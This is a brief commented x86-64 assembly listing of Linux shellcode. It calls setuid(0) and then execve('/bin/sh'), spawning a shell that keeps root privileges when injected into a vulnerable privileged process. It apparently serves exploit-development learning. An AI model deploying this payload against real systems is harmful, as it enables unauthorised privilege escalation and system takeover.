global _start; export the entrypoint of the program

section .text; gets loaded in the executable section of ELF

	_start: ; main execution starts from here
	;   optional : setuid(0)...to prevent dropping privileges
	mov rax, 0x69; sys_setuid
	mov rdi, 0; arg1 = rdi = 0
	syscall
	;   execve("/bin/sh", NULL, NULL)
	mov rax, 0x3b; sys_execve
	lea rdi, [ rel binsh ]
	mov rsi, 0
	mov rdx, 0
	syscall

binsh:
	db "/bin/sh", 0; Always NULL terminate your strings :)
